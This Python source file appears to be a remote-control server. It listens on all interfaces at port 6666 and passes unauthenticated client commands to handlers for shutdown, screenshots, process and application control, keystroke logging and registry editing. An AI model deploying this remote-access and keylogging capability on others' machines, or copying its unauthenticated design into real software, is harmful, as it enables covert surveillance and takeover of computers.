
import socket

from handler_state import HandlerState

from shutdown_handler import ShutdownHandler
from process_handler import ProcessHandler
from application_handler import ApplicationHandler
from screenshot_handler import ScreenshotHandler
from keystroke_handler import KeystrokeHandler
from registry_handler import RegistryHandler

HEADER = 64
FORMAT = "utf-8"

HOST = "0.0.0.0"
PORT = 6666
BACKLOG = 1

TEMP_PATH = "temp.txt"

class ServerProgram:
    QUIT_PROGRAM = 0
    CONTINUE_PROGRAM = 1

    def __init__(self):
        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.currHandler = None

        # Only accepts one client
        self.clientSocket = None
        self.address = None
        self.connected = False

    def __del__(self):
        self.serverSocket.close()
        self.clientSocket.close()

    def OpenServer(self, host=HOST, port=PORT, backlog=BACKLOG):
        self.serverSocket.bind((host, port))
        self.serverSocket.listen(backlog)
        self.clientSocket, self.address = self.serverSocket.accept()
        self.connected = True
        print(f'Connected to {self.address}')
        pass

    def CloseServer(self):
        self.connected = False
        self.clientSocket = self.address = None
        pass

    def Run(self):
        while True:
            req = self.ReceiveMessage()
            if not req:
                print("No messages sent")
                break
            state = self.HandleRequest(req)
            if state == ServerProgram.QUIT_PROGRAM:
                break

    def ReceiveMessage(self):
        message_length = self.clientSocket.recv(HEADER).decode(FORMAT)
        if message_length:
            length = int(message_length)
            rawmessage = self.clientSocket.recv(length)
            return rawmessage.decode(FORMAT)
        return None

    def SendMessage(self, string, binaryData=None):
        try:
            req = string.encode(FORMAT)
            if binaryData:
                req += b' ' + binaryData

            length = len(req)
            header = str(length).encode(FORMAT)
            header += b' ' * (HEADER - len(header))
            
            bytes_sent = self.clientSocket.send(header)
            assert bytes_sent == HEADER, "Length of sent message does not match that of the actual message"
                
            bytes_sent = self.clientSocket.send(req)
            assert bytes_sent == length, "Length of sent message does not match that of the actual message"

            return True
        except OSError as e:
            print(e)
            return False
        except AssertionError as e:
            print(e)
            return False

    def HandleRequest(self, requestString):
        immediate = False
        request, data = self.SplitRequest(requestString)

        state = HandlerState.INVALID
        extraInfo = None
        # FINISH request exits the current handler
        # EXIT request finishes the program
        if request == "FINISH":
            if self.currHandler:
                self.currHandler = None
                state = HandlerState.SUCCEEDED
            else:
                self.SendMessage("INVALID", None)
        elif request == "EXIT":
            self.currHandler = None
            self.SendMessage("SUCCEEDED", None)
            return ServerProgram.QUIT_PROGRAM 
        # If no handler is currently active
        elif not self.currHandler:
            # SHUTDOWN and SCREENSHOT are immeditate handlers
            if request == "SHUTDOWN":
                self.currHandler = ShutdownHandler()
                immediate = True
            elif request == "SCREENSHOT":
                self.currHandler = ScreenshotHandler()
                immediate = True
            # The rest needs additional requests and looping
            else:
                immediate = False
                if request == "PROCESS":
                    self.currHandler = ProcessHandler()
                    state = HandlerState.SUCCEEDED
                elif request == "APPLICATION":
                    self.currHandler = ApplicationHandler()
                    state = HandlerState.SUCCEEDED
                elif request == "KEYLOG":
                    self.currHandler = KeystrokeHandler(TEMP_PATH)
                    state = HandlerState.SUCCEEDED
                elif request == "REGISTRY":
                    self.currHandler = RegistryHandler()
                    state = HandlerState.SUCCEEDED

        # Else let current handler handle request
        else:
            state, extraInfo = self.currHandler.Execute(request, data)

        if self.currHandler and immediate:
            state, extraInfo = self.currHandler.Execute("", "")
            self.currHandler = None
            immediate = False

        a = 0
        if extraInfo:
            a = len(extraInfo)
        print(request, data, a)

        if state == HandlerState.SUCCEEDED:
            self.SendMessage("SUCCEEDED", extraInfo)
        elif state == HandlerState.FAILED:
            self.SendMessage("FAILED", extraInfo)
        else:
            self.SendMessage("INVALID", extraInfo)

        return ServerProgram.CONTINUE_PROGRAM


    def SplitRequest(self, request):
        a = request.split(" ", 1)
        if len(a) == 2:
            return a[0], a[1]
        elif len(a) == 1:
            return a[0], None
        else:
            raise ValueError("Empty request")


if __name__ == "__main__":
    program = ServerProgram()
    program.OpenServer(HOST, PORT, BACKLOG)
    program.Run()